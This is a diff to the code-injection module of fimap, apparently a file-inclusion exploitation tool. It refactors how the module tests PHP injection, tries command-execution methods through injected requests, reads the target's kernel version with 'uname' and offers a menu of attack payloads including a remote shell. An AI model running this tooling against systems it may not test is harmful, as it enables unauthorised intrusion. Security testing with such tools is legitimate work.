@@ -67,6 +67,10 @@ class codeinjector(baseClass):
         kernel = domain.getAttribute("kernel")
         postdata = vuln.getAttribute("postdata")
         ispost = vuln.getAttribute("ispost") == "1"
+        language = vuln.getAttribute("language")
+        
+        xml2config = self.config["XML2CONFIG"]
+        langClass = xml2config.getAllLangSets()[language]
         
         if (kernel == ""): kernel = None
         payload = "%s%s%s" %(prefix, shcode, suffix)
@@ -111,12 +115,10 @@ class codeinjector(baseClass):
                 print "fimap is currently not configured to exploit RFI vulnerabilitys."
                 sys.exit(1)
 
-        php_test_code = settings["php_info"][0]
-        php_test_result = settings["php_info"][1]
 
-        quiz, answer = self.getPHPQuiz()
-        php_test_code = php_test_code.replace("__PHP_QUIZ__", quiz)
-        php_test_result = php_test_result.replace("__PHP_ANSWER__", answer)
+        quiz, answer = langClass.generateQuiz()
+        php_test_code = quiz
+        php_test_result = answer
 
         code = self.__doHaxRequest(url, postdata, mode, php_test_code, suffix)
         if code == None:
@@ -127,16 +129,15 @@ class codeinjector(baseClass):
         if (code.find(php_test_result) != -1):
             self._log("PHP Injection works! Testing if execution works...", self.LOG_ALWAYS)
             php_inject_works = True
-            shell_test_code = settings["shell_test"][0]
-            shell_test_result = settings["shell_test"][1]
-            squiz, sanswer = self.getShellQuiz()
-            shell_test_code = shell_test_code.replace("__SHELL_QUIZ__", squiz)
-            shell_test_result = shell_test_result.replace("__SHELL_ANSWER__", sanswer)
-            for item in settings["php_exec"]:
+            shellquiz, shellanswer = xml2config.generateShellQuiz()
+            shell_test_code = shellquiz
+            shell_test_result = shellanswer
+            for item in langClass.getExecMethods():
                 try:
-                    name, payload = item
+                    name = item.getName()
+                    payload = None
                     self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
-                    testload = payload.replace("__PAYLOAD__", base64.b64encode(shell_test_code))
+                    testload = item.generatePayload(shell_test_code, True)
                     if (mode.find("A") != -1):
                         self.setUserAgent(testload)
                         code = self.doPostRequest(url, postdata)
@@ -157,7 +158,7 @@ class codeinjector(baseClass):
                         self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
                         if (kernel == None):
                             self._log("Requesting kernel version...", self.LOG_DEBUG)
-                            uname_cmd = payload.replace("__PAYLOAD__", base64.b64encode("uname -r -s"))
+                            uname_cmd = item.generatePayload("uname -r -s", True)
                             kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, suffix).strip()
                             self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
                             domain.setAttribute("kernel", kernel)
@@ -169,7 +170,7 @@ class codeinjector(baseClass):
                     
             attack = None
             while (attack != "q"):
-                attack = self.chooseAttackMode(php=php_inject_works, syst=sys_inject_works)
+                attack = self.chooseAttackMode(language, php=php_inject_works, syst=sys_inject_works)
                 
 
                 if (type(attack) == str):
@@ -338,32 +339,40 @@ class codeinjector(baseClass):
         return(userload)
 
 
-    def chooseAttackMode(self, php=True, syst=True):
+    def chooseAttackMode(self, language, php=True, syst=True):
         header = ""
         choose = {}
         textarr = []
         idx = 1
         
+        xml2config = self.config["XML2CONFIG"]
+        langClass = xml2config.getAllLangSets()[language]
+        
         if (syst):
-            header = ":: Available Attacks - PHP and SHELL access ::"
+            header = ":: Available Attacks - %s and SHELL access ::" %(language)
             textarr.append("[1] Spawn fimap shell")
             choose[1] = "fimap_shell"
             idx = 2
-            for k,v in settings["payloads"]["php"].items():
+            for payloadobj in langClass.getPayloads():
+                k = payloadobj.getName()
+                v = payloadobj
                 textarr.append("[%d] %s"%(idx,k))
-                choose[idx] = ("php", v)
+                choose[idx] = v
                 idx = idx +1
-
-            for k,v in settings["payloads"]["sys"].items():
-                textarr.append("[%d] %s"%(idx,k))
-                choose[idx] = ("sys",v)
-                idx = idx +1
+            
+            #TODO: SYSTEM COMMANDS FROM GENERIC.XML
+            #for k,v in settings["payloads"]["sys"].items():
+            #    textarr.append("[%d] %s"%(idx,k))
+            #    choose[idx] = ("sys",v)
+            #    idx = idx +1
 
         else:
-            header = ":: Available Attacks - PHP Only ::"
-            for k,v in settings["payloads"]["php"].items():
+            header = ":: Available Attacks - %s Only ::" %(language)
+            for payloadobj in langClass.getPayloads():
+                k = payloadobj.getName()
+                v = payloadobj
                 textarr.append("[%d] %s"%(idx,k))
-                choose[idx] = ("php", v)
+                choose[idx] = v
                 idx = idx +1
 
         textarr.append("[q] Quit")
